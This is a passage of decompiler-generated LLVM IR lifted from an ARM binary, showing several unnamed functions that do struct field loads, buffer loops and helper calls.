  store i32 %v2_f6c0, i32* %ip.global-to-local, align 4
  %v3_f6c0 = add i32 %v0_f6b8, 28
  %v4_f6c0 = inttoptr i32 %v3_f6c0 to i32*
  %v5_f6c0 = load i32, i32* %v4_f6c0, align 4
  store i32 %v5_f6c0, i32* %lr.global-to-local, align 4
  %v1_f6c4 = load i32, i32* %r6.global-to-local, align 4
  %v2_f6c4 = add i32 %v1_f6c4, 44
  %v3_f6c4 = inttoptr i32 %v2_f6c4 to i32*
  store i32 %v3_f6b8, i32* %v3_f6c4, align 4
  %v0_f6c8 = load i32, i32* %r5.global-to-local, align 4
  %v1_f6c8 = add i32 %v0_f6c8, 64
  %v2_f6c8 = inttoptr i32 %v1_f6c8 to i32*
  %v3_f6c8 = load i32, i32* %v2_f6c8, align 4
  %v1_f6cc = add i32 %v0_f6c8, 56
  %v2_f6cc = inttoptr i32 %v1_f6cc to i32*
  %v3_f6cc = load i32, i32* %v2_f6cc, align 4
  store i32 %v3_f6cc, i32* %r2.global-to-local, align 4
  %v1_f6d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_f6d0 = add i32 %v1_f6d0, 52
  %v3_f6d0 = inttoptr i32 %v2_f6d0 to i32*
  store i32 %v3_f6c8, i32* %v3_f6d0, align 4
  %v0_f6d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_f6d4 = load i32, i32* %r6.global-to-local, align 4
  %v2_f6d4 = add i32 %v1_f6d4, 48
  %v3_f6d4 = inttoptr i32 %v2_f6d4 to i32*
  store i32 %v0_f6d4, i32* %v3_f6d4, align 4
  %v0_f6d8 = load i32, i32* %r5.global-to-local, align 4
  %v1_f6d8 = add i32 %v0_f6d8, 72
  %v1_f6dc = inttoptr i32 %v1_f6d8 to i32*
  %v2_f6dc = load i32, i32* %v1_f6dc, align 4
  %v3_f6dc = add i32 %v0_f6d8, 76
  %v4_f6dc = inttoptr i32 %v3_f6dc to i32*
  %v5_f6dc = load i32, i32* %v4_f6dc, align 4
  store i32 %v5_f6dc, i32* %r1.global-to-local, align 4
  %v0_f6e0 = load i32, i32* %r6.global-to-local, align 4
  %v1_f6e0 = add i32 %v0_f6e0, 56
  %v1_f6e4 = inttoptr i32 %v1_f6e0 to i32*
  store i32 %v2_f6dc, i32* %v1_f6e4, align 4
  %v3_f6e4 = add i32 %v0_f6e0, 60
  %v4_f6e4 = inttoptr i32 %v3_f6e4 to i32*
  %v5_f6e4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_f6e4, i32* %v4_f6e4, align 4
  %v0_f6e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_f6e8 = add i32 %v0_f6e8, 80
  %v1_f6ec = inttoptr i32 %v1_f6e8 to i32*
  %v2_f6ec = load i32, i32* %v1_f6ec, align 4
  %v3_f6ec = add i32 %v0_f6e8, 84
  %v4_f6ec = inttoptr i32 %v3_f6ec to i32*
  %v5_f6ec = load i32, i32* %v4_f6ec, align 4
  store i32 %v5_f6ec, i32* %r1.global-to-local, align 4
  %v0_f6f0 = load i32, i32* %r6.global-to-local, align 4
  %v1_f6f0 = add i32 %v0_f6f0, 64
  %v1_f6f4 = inttoptr i32 %v1_f6f0 to i32*
  store i32 %v2_f6ec, i32* %v1_f6f4, align 4
  %v3_f6f4 = add i32 %v0_f6f0, 68
  %v4_f6f4 = inttoptr i32 %v3_f6f4 to i32*
  %v5_f6f4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_f6f4, i32* %v4_f6f4, align 4
  %v0_f6f8 = load i32, i32* %r5.global-to-local, align 4
  %v1_f6f8 = add i32 %v0_f6f8, 16
  %v2_f6f8 = inttoptr i32 %v1_f6f8 to i32*
  %v3_f6f8 = load i32, i32* %v2_f6f8, align 4
  %v1_f6fc = load i32, i32* %r6.global-to-local, align 4
  %v2_f6fc = add i32 %v1_f6fc, 16
  %v3_f6fc = inttoptr i32 %v2_f6fc to i32*
  store i32 %v3_f6f8, i32* %v3_f6fc, align 4
  %v0_f700 = load i32, i32* %r5.global-to-local, align 4
  %v1_f700 = add i32 %v0_f700, 88
  %v1_f704 = add i32 %v0_f700, 20
  %v2_f704 = inttoptr i32 %v1_f704 to i32*
  %v3_f704 = load i32, i32* %v2_f704, align 4
  store i32 %v3_f704, i32* %r2.global-to-local, align 4
  %v1_f708 = inttoptr i32 %v1_f700 to i32*
  %v2_f708 = load i32, i32* %v1_f708, align 4
  %v3_f708 = add i32 %v0_f700, 92
  %v4_f708 = inttoptr i32 %v3_f708 to i32*
  %v5_f708 = load i32, i32* %v4_f708, align 4
  store i32 %v5_f708, i32* %r1.global-to-local, align 4
  %v0_f70c = load i32, i32* %r6.global-to-local, align 4
  %v1_f70c = add i32 %v0_f70c, 72
  %v1_f710 = inttoptr i32 %v1_f70c to i32*
  store i32 %v2_f708, i32* %v1_f710, align 4
  %v3_f710 = add i32 %v0_f70c, 76
  %v4_f710 = inttoptr i32 %v3_f710 to i32*
  %v5_f710 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_f710, i32* %v4_f710, align 4
  %v0_f714 = load i32, i32* %r2.global-to-local, align 4
  %v1_f714 = load i32, i32* %r6.global-to-local, align 4
  %v2_f714 = add i32 %v1_f714, 20
  %v3_f714 = inttoptr i32 %v2_f714 to i32*
  store i32 %v0_f714, i32* %v3_f714, align 4
  %v0_f718 = load i32, i32* %ip.global-to-local, align 4
  %v1_f718 = load i32, i32* %r6.global-to-local, align 4
  %v2_f718 = add i32 %v1_f718, 24
  %v3_f718 = inttoptr i32 %v2_f718 to i32*
  store i32 %v0_f718, i32* %v3_f718, align 4
  %v0_f71c = load i32, i32* %lr.global-to-local, align 4
  %v1_f71c = load i32, i32* %r6.global-to-local, align 4
  %v2_f71c = add i32 %v1_f71c, 28
  %v3_f71c = inttoptr i32 %v2_f71c to i32*
  store i32 %v0_f71c, i32* %v3_f71c, align 4
  %v2_f720 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_f720, i32* %r4.global-to-local, align 4
  ret i32 %v2_f708

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 96, { 4, 2, 3, 0, 1, 5, 6 }
  uselistorder i32 88, { 5, 0, 6, 1, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @function_f728(i32* %arg1) local_unnamed_addr {
dec_label_pc_f728:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* @r6, align 4
  %v1_f73c = add i32 %tmp, 24
  store i32 %v1_f73c, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_f754 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 112) to i32*), align 4
  store i32 %v4_f754, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_f754)
  %v0_f768 = load i32, i32* @r6, align 4
  %v2_f768 = add i32 %v0_f768, 16
  %v3_f768 = inttoptr i32 %v2_f768 to i32*
  %v4_f768 = load i32, i32* %v3_f768, align 4
  store i32 %v4_f768, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_f768)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_f778

dec_label_pc_f778:                                ; preds = %dec_label_pc_f7a8, %dec_label_pc_f728
  %v0_f778 = load i32, i32* @r5, align 4
  %v1_f778 = add i32 %v0_f778, 4
  %v2_f778 = inttoptr i32 %v1_f778 to i32*
  %v3_f778 = load i32, i32* %v2_f778, align 4
  %v4_f778 = add i32 %v0_f778, 8
  %v5_f778 = inttoptr i32 %v4_f778 to i32*
  %v6_f778 = load i32, i32* %v5_f778, align 4
  %tmp10 = icmp ugt i32 %v6_f778, %v3_f778
  br i1 %tmp10, label %dec_label_pc_f7a8, label %dec_label_pc_f784

dec_label_pc_f784:                                ; preds = %dec_label_pc_f778
  %v1_f784 = inttoptr i32 %v0_f778 to i32*
  %v2_f784 = load i32, i32* %v1_f784, align 4
  %v1_f788 = add i32 %v0_f778, 12
  %v2_f788 = inttoptr i32 %v1_f788 to i32*
  %v3_f788 = load i32, i32* %v2_f788, align 4
  %v1_f78c = add i32 %v0_f778, 20
  %v2_f78c = inttoptr i32 %v1_f78c to i32*
  %v3_f78c = load i32, i32* %v2_f78c, align 4
  %v4_f790 = inttoptr i32 %v3_f788 to i32*
  %v5_f790 = call i32 @function_12194(i32 %v2_f784, i32* %v4_f790, i32 %v3_f78c, i32 %v6_f778)
  %tmp9 = icmp slt i32 %v5_f790, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_f7a0

.thread:                                          ; preds = %dec_label_pc_f784
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_f7d8

dec_label_pc_f7a0:                                ; preds = %dec_label_pc_f784
  %v1_f7a0 = load i32, i32* @r5, align 4
  %v2_f7a0 = add i32 %v1_f7a0, 8
  %v3_f7a0 = inttoptr i32 %v2_f7a0 to i32*
  store i32 %v5_f790, i32* %v3_f7a0, align 4
  %v0_f7a4 = load i32, i32* @r7, align 4
  %v1_f7a4 = load i32, i32* @r5, align 4
  %v2_f7a4 = add i32 %v1_f7a4, 4
  %v3_f7a4 = inttoptr i32 %v2_f7a4 to i32*
  store i32 %v0_f7a4, i32* %v3_f7a4, align 4
  %v0_f7a8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f7a8

dec_label_pc_f7a8:                                ; preds = %dec_label_pc_f778, %dec_label_pc_f7a0
  %v1_f7cc = phi i32 [ %v0_f778, %dec_label_pc_f778 ], [ %v0_f7a8.pre, %dec_label_pc_f7a0 ]
  %v1_f7a8 = add i32 %v1_f7cc, 4
  %v2_f7a8 = inttoptr i32 %v1_f7a8 to i32*
  %v3_f7a8 = load i32, i32* %v2_f7a8, align 4
  %v1_f7ac = add i32 %v1_f7cc, 12
  %v2_f7ac = inttoptr i32 %v1_f7ac to i32*
  %v3_f7ac = load i32, i32* %v2_f7ac, align 4
  %v2_f7b0 = add i32 %v3_f7ac, %v3_f7a8
  store i32 %v2_f7b0, i32* @r4, align 4
  %v3_f7b4 = inttoptr i32 %v2_f7b0 to i32*
  %v4_f7b4 = load i32, i32* %v3_f7b4, align 4
  %v1_f7b8 = add i32 %v2_f7b0, 4
  %v2_f7b8 = inttoptr i32 %v1_f7b8 to i32*
  %v3_f7b8 = load i32, i32* %v2_f7b8, align 4
  %v1_f7bc = add i32 %v2_f7b0, 16
  %v2_f7bc = inttoptr i32 %v1_f7bc to i16*
  %v3_f7bc = load i16, i16* %v2_f7bc, align 2
  %v4_f7bc = zext i16 %v3_f7bc to i32
  %v1_f7c0 = add i32 %v2_f7b0, 8
  %v2_f7c0 = inttoptr i32 %v1_f7c0 to i32*
  %v3_f7c0 = load i32, i32* %v2_f7c0, align 4
  store i32 %v3_f7c0, i32* %ip.global-to-local, align 4
  %v2_f7c4 = add i32 %v4_f7bc, %v3_f7a8
  %v2_f7c8 = or i32 %v3_f7b8, %v4_f7b4
  %v4_f7c8 = icmp eq i32 %v2_f7c8, 0
  store i32 %v2_f7c4, i32* %v2_f7a8, align 4
  %v0_f7d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_f7d0 = load i32, i32* @r5, align 4
  %v2_f7d0 = add i32 %v1_f7d0, 16
  %v3_f7d0 = inttoptr i32 %v2_f7d0 to i32*
  store i32 %v0_f7d0, i32* %v3_f7d0, align 4
  br i1 %v4_f7c8, label %dec_label_pc_f778, label %dec_label_pc_f7d8

dec_label_pc_f7d8:                                ; preds = %dec_label_pc_f7a8, %.thread
  %v0_f7e4 = load i32, i32* @r6, align 4
  %v2_f7e4 = add i32 %v0_f7e4, 44
  %v3_f7e4 = inttoptr i32 %v2_f7e4 to i32*
  %v4_f7e4 = load i32, i32* %v3_f7e4, align 4
  store i32 %v4_f7e4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_f7e4)
  %v0_f7f0 = load i32, i32* @r4, align 4
  ret i32 %v0_f7f0

; uselistorder directives
  uselistorder i32 %v2_f7b0, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_f7cc, { 1, 0 }
  uselistorder i32 %v6_f778, { 1, 0 }
  uselistorder i32 %v0_f778, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_f7a8, { 1, 0 }
}

define i32 @function_f804(i32 %arg1) local_unnamed_addr {
dec_label_pc_f804:
  %v0_f804 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f804, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_f804
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_f804, %bb
  %v4_f810 = phi i32 [ %arg1, %dec_label_pc_f804 ], [ 0, %bb ]
  ret i32 %v4_f810

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_f814(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_f814:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_f814 = load i32, i32* @r4, align 4
  %v6_f814 = load i32, i32* @r5, align 4
  %v9_f814 = load i32, i32* @r6, align 4
  %v12_f814 = load i32, i32* @r7, align 4
  %v15_f814 = load i32, i32* @r8, align 4
  %v18_f814 = load i32, i32* @sb, align 4
  %v21_f814 = load i32, i32* @sl, align 4
  %v24_f814 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_f818 = icmp eq i32* %arg1, null
  store i1 %v2_f818, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_f818, label %dec_label_pc_fb28, label %dec_label_pc_f830

dec_label_pc_f830:                                ; preds = %dec_label_pc_f814
  %v1_f830 = urem i32 %arg3, 256
  store i32 %v1_f830, i32* @sb, align 4
  %v1_f834 = udiv i32 %arg3, 256
  %v3_f838 = urem i32 %v1_f834, 256
  %v3_f83c = mul nuw nsw i32 %v1_f830, 4
  %v1_f844 = or i32 %v3_f83c, 1
  %v1_f850 = and i32 %arg3, 131072
  %v1_f854 = add nsw i32 %v1_f830, -1
  %v1_f860 = and i32 %arg3, 262144
  store i32 %v1_f860, i32* %r2.global-to-local, align 4
  %v1_f864 = and i32 %arg3, 65536
  store i32 %v1_f864, i32* %r3.global-to-local, align 4
  store i32 %v1_f864, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_f874 = add i32 %arg4, 1
  store i32 %v1_f874, i32* @sl, align 4
  %v2_f9ec = icmp eq i32 %v1_f850, 0
  %v1_fa44 = inttoptr i32 %arg2 to i32*
  %v2_fa5c = icmp eq i32 %v1_f860, 0
  br label %dec_label_pc_f878

dec_label_pc_f878:                                ; preds = %dec_label_pc_f878.backedge, %dec_label_pc_f830
  %v2_f894 = phi i32 [ %v0_f878.pre, %dec_label_pc_f878.backedge ], [ %tmp, %dec_label_pc_f830 ]
  %v1_f878 = add i32 %v2_f894, 4
  %v2_f878 = inttoptr i32 %v1_f878 to i32*
  %v3_f878 = load i32, i32* %v2_f878, align 4
  store i32 %v3_f878, i32* %r3.global-to-local, align 4
  %v2_f87c = icmp eq i32 %v3_f878, 0
  store i1 %v2_f87c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f87c, label %dec_label_pc_f884, label %dec_label_pc_f8cc

dec_label_pc_f884:                                ; preds = %dec_label_pc_f878
  %v1_f884 = add i32 %v2_f894, 16
  %v2_f884 = inttoptr i32 %v1_f884 to i32*
  %v3_f884 = load i32, i32* %v2_f884, align 4
  store i32 %v3_f884, i32* %r3.global-to-local, align 4
  %v2_f888 = icmp eq i32 %v3_f884, 0
  store i1 %v2_f888, i1* %cpsr_z.global-to-local, align 1
  %v1_f88c = add i32 %v2_f894, 8
  %v2_f88c = inttoptr i32 %v1_f88c to i32*
  %v3_f88c = load i32, i32* %v2_f88c, align 4
  store i32 %v3_f88c, i32* %r3.global-to-local, align 4
  br i1 %v2_f888, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_f884
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_f884, align 4
  %v0_f898.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_f884, %bb
  %v0_f898 = phi i32 [ %v0_f898.pre, %bb ], [ %v3_f88c, %dec_label_pc_f884 ]
  %v2_f898 = icmp eq i32 %v0_f898, 0
  store i1 %v2_f898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f898, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_f844, i32* %r3.global-to-local, align 4
  %v2_f8a0 = load i32, i32* @r5, align 4
  %v3_f8a0 = add i32 %v2_f8a0, 8
  %v4_f8a0 = inttoptr i32 %v3_f8a0 to i32*
  store i32 %v1_f844, i32* %v4_f8a0, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_f8a4 = load i32, i32* @r5, align 4
  %v1_f8a4 = add i32 %v0_f8a4, 16
  %v2_f8a4 = inttoptr i32 %v1_f8a4 to i32*
  %v3_f8a4 = load i32, i32* %v2_f8a4, align 4
  store i32 %v3_f8a4, i32* %r0.global-to-local, align 4
  %v1_f8a8 = add i32 %v0_f8a4, 8
  %v2_f8a8 = inttoptr i32 %v1_f8a8 to i32*
  %v3_f8a8 = load i32, i32* %v2_f8a8, align 4
  store i32 %v3_f8a8, i32* %r3.global-to-local, align 4
  %v2_f8ac = add i32 %v3_f8a8, %v3_f8a4
  store i32 %v2_f8ac, i32* %r0.global-to-local, align 4
  %v1_f8b0 = call i32 @function_c77c(i32 %v2_f8ac)
  store i32 %v1_f8b0, i32* %r0.global-to-local, align 4
  %v2_f8b4 = icmp eq i32 %v1_f8b0, 0
  store i1 %v2_f8b4, i1* %cpsr_z.global-to-local, align 1
  %v1_f8b8 = load i32, i32* @r5, align 4
  %v2_f8b8 = add i32 %v1_f8b8, 4
  %v3_f8b8 = inttoptr i32 %v2_f8b8 to i32*
  store i32 %v1_f8b0, i32* %v3_f8b8, align 4
  br i1 %v2_f8b4, label %dec_label_pc_fb28, label %dec_label_pc_f8c0

dec_label_pc_f8c0:                                ; preds = %.thread
  %v0_f8c0 = load i32, i32* @r5, align 4
  %v1_f8c0 = add i32 %v0_f8c0, 20
  %v2_f8c0 = inttoptr i32 %v1_f8c0 to i32*
  %v3_f8c0 = load i32, i32* %v2_f8c0, align 4
  %v1_f8c4 = or i32 %v3_f8c0, 1
  store i32 %v1_f8c4, i32* %r3.global-to-local, align 4
  store i32 %v1_f8c4, i32* %v2_f8c0, align 4
  %v0_f8cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f8cc

dec_label_pc_f8cc:                                ; preds = %dec_label_pc_f878, %dec_label_pc_f8c0
  %v1_f8d4 = phi i32 [ %v2_f894, %dec_label_pc_f878 ], [ %v0_f8cc.pre, %dec_label_pc_f8c0 ]
  %v1_f8cc = add i32 %v1_f8d4, 4
  %v2_f8cc = inttoptr i32 %v1_f8cc to i32*
  %v3_f8cc = load i32, i32* %v2_f8cc, align 4
  store i32 %v3_f8cc, i32* %r2.global-to-local, align 4
  %v4_f8cc = add i32 %v1_f8d4, 8
  %v5_f8cc = inttoptr i32 %v4_f8cc to i32*
  %v6_f8cc = load i32, i32* %v5_f8cc, align 4
  %v2_f8d0 = add i32 %v6_f8cc, %v3_f8cc
  store i32 %v2_f8d0, i32* %r3.global-to-local, align 4
  %v2_f8d4 = add i32 %v1_f8d4, 12
  %v3_f8d4 = inttoptr i32 %v2_f8d4 to i32*
  store i32 %v2_f8d0, i32* %v3_f8d4, align 4
  %v0_f8d8 = load i32, i32* @fp, align 4
  store i32 %v0_f8d8, i32* @r6, align 4
  br label %dec_label_pc_f8dc

dec_label_pc_f8dc:                                ; preds = %dec_label_pc_f968, %dec_label_pc_f954, %dec_label_pc_f8cc
  %v0_f8e4 = phi i32 [ %v0_f8d8, %dec_label_pc_f8cc ], [ %v1_f954, %dec_label_pc_f954 ], [ %v0_f8e4.pre.pre, %dec_label_pc_f968 ]
  %v0_f8dc = load i32, i32* @r5, align 4
  %v1_f8dc = add i32 %v0_f8dc, 12
  store i32 %v1_f8dc, i32* %r0.global-to-local, align 4
  %v1_f8e0 = inttoptr i32 %v1_f8dc to i32*
  %v2_f8e0 = load i32, i32* %v1_f8e0, align 4
  store i32 %v2_f8e0, i32* %r0.global-to-local, align 4
  %v3_f8e0 = add i32 %v0_f8dc, 16
  %v4_f8e0 = inttoptr i32 %v3_f8e0 to i32*
  %v5_f8e0 = load i32, i32* %v4_f8e0, align 4
  %v2_f8e4 = add i32 %v2_f8e0, %v0_f8e4
  store i32 %v2_f8e4, i32* %r0.global-to-local, align 4
  %v2_f8e8 = sub i32 %v5_f8e0, %v0_f8e4
  %v1_f8ec = inttoptr i32 %v0_f8dc to i32*
  %v2_f8ec = load i32, i32* %v1_f8ec, align 4
  store i32 %v2_f8ec, i32* %r2.global-to-local, align 4
  %v3_f8f0 = call i32 @function_106c0(i32 %v2_f8e4, i32 %v2_f8e8, i32 %v2_f8ec)
  store i32 %v3_f8f0, i32* %r0.global-to-local, align 4
  store i32 %v3_f8f0, i32* %r4.global-to-local, align 4
  %v2_f8f4 = icmp eq i32 %v3_f8f0, 0
  store i1 %v2_f8f4, i1* %cpsr_z.global-to-local, align 1
  %v0_f8fc = load i32, i32* @r5, align 4
  %v1_f8fc = add i32 %v0_f8fc, 12
  br i1 %v2_f8f4, label %dec_label_pc_f8fc, label %dec_label_pc_f914

dec_label_pc_f8fc:                                ; preds = %dec_label_pc_f8dc
  store i32 %v1_f8fc, i32* %r0.global-to-local, align 4
  %v1_f900 = inttoptr i32 %v1_f8fc to i32*
  %v2_f900 = load i32, i32* %v1_f900, align 4
  store i32 %v2_f900, i32* %r0.global-to-local, align 4
  %v3_f900 = add i32 %v0_f8fc, 16
  %v4_f900 = inttoptr i32 %v3_f900 to i32*
  %v5_f900 = load i32, i32* %v4_f900, align 4
  store i32 %v5_f900, i32* %r2.global-to-local, align 4
  %v3_f908 = inttoptr i32 %v2_f900 to i8*
  %v4_f908 = call i32 @function_bff0(i8* %v3_f908, i32 0, i32 %v5_f900)
  store i32 %v4_f908, i32* %r0.global-to-local, align 4
  %v0_f90c = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fb2c

dec_label_pc_f914:                                ; preds = %dec_label_pc_f8dc
  %v2_f914 = inttoptr i32 %v1_f8fc to i32*
  %v3_f914 = load i32, i32* %v2_f914, align 4
  store i32 %v3_f914, i32* @r4, align 4
  %v1_f918 = load i32, i32* @r6, align 4
  %v2_f918 = add i32 %v1_f918, %v3_f914
  store i32 %v2_f918, i32* %r0.global-to-local, align 4
  %v1_f91c = call i32 @function_114c0(i32 %v2_f918)
  %v0_f924 = load i32, i32* @r6, align 4
  %v2_f924 = add i32 %v0_f924, %v1_f91c
  store i32 %v2_f924, i32* @r6, align 4
  %v0_f928 = load i32, i32* @r4, align 4
  store i32 %v0_f928, i32* @r0, align 4
  %v2_f92c = call i32 @function_11520(i32 %v0_f928, i32 10)
  store i32 %v2_f92c, i32* %r0.global-to-local, align 4
  %v2_f930 = icmp eq i32 %v2_f92c, 0
  store i1 %v2_f930, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f930, label %dec_label_pc_f95c, label %dec_label_pc_f938

dec_label_pc_f938:                                ; preds = %dec_label_pc_f914
  %v1_f938 = inttoptr i32 %v2_f92c to i8*
  %v2_f938 = load i8, i8* %v1_f938, align 1
  %v3_f938 = zext i8 %v2_f938 to i32
  %v1_f93c = add nuw nsw i32 %v3_f938, 255
  %v1_f940 = urem i32 %v1_f93c, 256
  store i32 %v1_f940, i32* %r3.global-to-local, align 4
  %v7_f944 = icmp eq i32 %v1_f940, 92
  store i1 %v7_f944, i1* %cpsr_z.global-to-local, align 1
  %v1_f948 = trunc i32 %v1_f93c to i8
  store i8 %v1_f948, i8* %v1_f938, align 1
  %v0_f94c = load i32, i32* @r6, align 4
  %v1_f94c = add i32 %v0_f94c, -1
  store i32 %v1_f94c, i32* @r6, align 4
  %v0_f950 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f950, label %dec_label_pc_f954, label %dec_label_pc_f9e0

dec_label_pc_f954:                                ; preds = %dec_label_pc_f938
  %v1_f954 = add i32 %v0_f94c, -2
  store i32 %v1_f954, i32* @r6, align 4
  br label %dec_label_pc_f8dc

dec_label_pc_f95c:                                ; preds = %dec_label_pc_f914
  %v0_f95c = load i32, i32* @r5, align 4
  %v1_f95c = add i32 %v0_f95c, 20
  %v2_f95c = inttoptr i32 %v1_f95c to i32*
  %v3_f95c = load i32, i32* %v2_f95c, align 4
  store i32 %v3_f95c, i32* %r3.global-to-local, align 4
  %v2_f960 = icmp eq i32 %v3_f95c, 0
  store i1 %v2_f960, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f960, label %dec_label_pc_f998, label %dec_label_pc_f968

dec_label_pc_f968:                                ; preds = %dec_label_pc_f95c
  %v1_f968 = add i32 %v0_f95c, 16
  %v2_f968 = inttoptr i32 %v1_f968 to i32*
  %v3_f968 = load i32, i32* %v2_f968, align 4
  store i32 %v3_f968, i32* %r3.global-to-local, align 4
  %v1_f96c = add i32 %v0_f95c, 8
  %v2_f96c = inttoptr i32 %v1_f96c to i32*
  %v3_f96c = load i32, i32* %v2_f96c, align 4
  %v1_f970 = add i32 %v3_f968, 4096
  store i32 %v1_f970, i32* %r3.global-to-local, align 4
  %v2_f974 = add i32 %v3_f96c, %v1_f970
  store i32 %v1_f970, i32* %v2_f968, align 4
  %v0_f97c = load i32, i32* @r5, align 4
  %v1_f97c = add i32 %v0_f97c, 4
  %v2_f97c = inttoptr i32 %v1_f97c to i32*
  %v3_f97c = load i32, i32* %v2_f97c, align 4
  store i32 %v3_f97c, i32* %r0.global-to-local, align 4
  %v2_f980 = inttoptr i32 %v3_f97c to i32*
  %v3_f980 = call i32 @function_1187c(i32* %v2_f980, i32 %v2_f974)
  store i32 %v3_f980, i32* %r0.global-to-local, align 4
  %v0_f984 = load i32, i32* @r5, align 4
  %v1_f984 = add i32 %v0_f984, 8
  %v2_f984 = inttoptr i32 %v1_f984 to i32*
  %v3_f984 = load i32, i32* %v2_f984, align 4
  %v2_f988 = add i32 %v3_f984, %v3_f980
  store i32 %v2_f988, i32* %r3.global-to-local, align 4
  %v2_f98c = add i32 %v0_f984, 12
  %v3_f98c = inttoptr i32 %v2_f98c to i32*
  store i32 %v2_f988, i32* %v3_f98c, align 4
  %v1_f990 = load i32, i32* @r5, align 4
  %v2_f990 = add i32 %v1_f990, 4
  %v3_f990 = inttoptr i32 %v2_f990 to i32*
  store i32 %v3_f980, i32* %v3_f990, align 4
  %v0_f8e4.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_f8dc

dec_label_pc_f998:                                ; preds = %dec_label_pc_f95c, %.dec_label_pc_f998_crit_edge
  %v0_f998 = phi i32 [ %v0_f998.pre, %.dec_label_pc_f998_crit_edge ], [ %v0_f95c, %dec_label_pc_f95c ]
  %v1_f998 = inttoptr i32 %v0_f998 to i32*
  %v2_f998 = load i32, i32* %v1_f998, align 4
  store i32 %v2_f998, i32* @r1, align 4
  %v1_f99c = add i32 %v2_f998, 52
  %v2_f99c = inttoptr i32 %v1_f99c to i32*
  %v3_f99c = load i32, i32* %v2_f99c, align 4
  store i32 %v3_f99c, i32* %r3.global-to-local, align 4
  %v2_f9a0 = icmp eq i32 %v3_f99c, 0
  store i1 %v2_f9a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f9a0, label %dec_label_pc_f9cc, label %dec_label_pc_f9a8

dec_label_pc_f9a8:                                ; preds = %dec_label_pc_f998
  %v1_f9a8 = add i32 %v2_f998, 16
  %v2_f9a8 = inttoptr i32 %v1_f9a8 to i32*
  %v3_f9a8 = load i32, i32* %v2_f9a8, align 4
  store i32 %v3_f9a8, i32* %r2.global-to-local, align 4
  %v1_f9ac = add i32 %v2_f998, 24
  %v2_f9ac = inttoptr i32 %v1_f9ac to i32*
  %v3_f9ac = load i32, i32* %v2_f9ac, align 4
  store i32 %v3_f9ac, i32* %r3.global-to-local, align 4
  %v3_f9b0 = icmp ult i32 %v3_f9a8, %v3_f9ac
  %v9_f9b0 = icmp eq i32 %v3_f9a8, %v3_f9ac
  store i1 %v9_f9b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f9b0, label %dec_label_pc_f9d4thread-pre-split, label %dec_label_pc_f9c0

dec_label_pc_f9c0:                                ; preds = %dec_label_pc_f9a8
  store i32 %v2_f998, i32* %r0.global-to-local, align 4
  %v1_f9c4 = inttoptr i32 %v2_f998 to i16*
  %v2_f9c4 = call i32 @function_10e38(i16* %v1_f9c4)
  store i32 %v2_f9c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f9d4

dec_label_pc_f9cc:                                ; preds = %dec_label_pc_f998
  store i32 %v2_f998, i32* %r0.global-to-local, align 4
  %v1_f9d0 = call i32 @function_1057c(i32 %v2_f998)
